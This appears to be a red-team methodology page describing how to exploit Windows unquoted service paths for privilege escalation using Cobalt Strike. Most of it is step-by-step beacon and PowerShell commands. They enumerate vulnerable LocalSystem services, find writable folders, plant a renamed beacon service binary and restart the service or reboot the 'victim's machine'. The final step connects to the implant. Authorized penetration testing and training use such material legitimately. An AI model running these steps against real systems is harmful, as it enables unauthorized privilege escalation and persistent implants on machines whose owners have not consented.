---
title: "Unquoted Service Path Abuse Methodology"
author: "nickvourd"
description: "An unquoted service path is where the path to the service binary is not wrapped in quotes. When Windows attempts to read the path to this executable, it interprets the space as a terminator."
date: 2022-01-27
---


### An unquoted service path is where the path to the service binary is not wrapped in quotes. When Windows attempts to read the path to this executable, it interprets the space as a terminator.
---

#### -> Find apps vulnerable to Unquoted Service Path (Beacon Command):

```powershell
$ powershell Get-CimInstance win32_service | select Name,DisplayName,PathName,StartMode,StartName | where {$_.StartMode -ne "Disabled" -and $_.StartName -eq "LocalSystem" -and $_.PathName -notmatch "`"" -and $_.PathName -notmatch "C:\\Windows"} | Format-List
```

* If you can't find any vulnerable service just use the following command and search manually all services (Beacon Command):

```powershell
$ powershell Get-CimInstance win32_service | select Name,PathName,StartMode,StartName | fl
```


#### -> Find Information about the vulnearble service such as STATUS, SERVICE_START_NAME, START_TYPE etc (Beacon Command):

```powershell
$ powerhell sc.exe qc "Sevice_Name"
```


#### -> Try to find a writable folder (Beacon Command):

```powershell
$ powershell Get-Acl -Path "C:\[Path]\[Path]" | fl
```



#### -> Generate the maliacious implant and upload this on writable directory or in writable service file.
* Payloads to abuse services must be specific "service binaries". We can do this in Cobalt Strike via `Attacks > Packages > Windows Executable (S)` and selecting the `Service Binary` output type.


#### -> Rename the name of beacon-tcp.exe to the name of tha folder or service name before the space (Beacon Command):

```powershell
$ powershell mv beacon-tcp.exe [name_of_folder_or_service_name_before_space].exe
```
#### -> Check the service status (Beacon Command):

```powershell
$ powershell sc.exe query [service_name]
```

#### -> Use .accesschk from Sysinternals Suite in order to check permissions to start/stop the service (Beacon Command):

```powershell
$ powershell .\accesschk64.exe /accepteula -ucqv [user] [service_name]
```

* If you have persmisions to stop/start just stop the service (Beacon Command):

```powershell
$ powershell sc.exe stop [service_name]
```

* Then, start the service again (Beacon Command):

```powershell
$ powershell sc.exe start [service_name]
```

* Next, verify that the port is listening on victim's localhost (Beacon Command):

```powershell
$ run netstat -anp TCP
```

* Last but not least connect to the listening beacon (Beacon Command):

```powershell
$ connect localhost [port]
```

#### -> If you don't have permissions to start/stop the victim's vulnerable service, just reboot the victim's machine and connect to TCP Beacon.


---

###### Social links
- [[GitHub]](https://github.com/nickvourd)
- [[Twitter]](https://twitter.com/nickvourd)
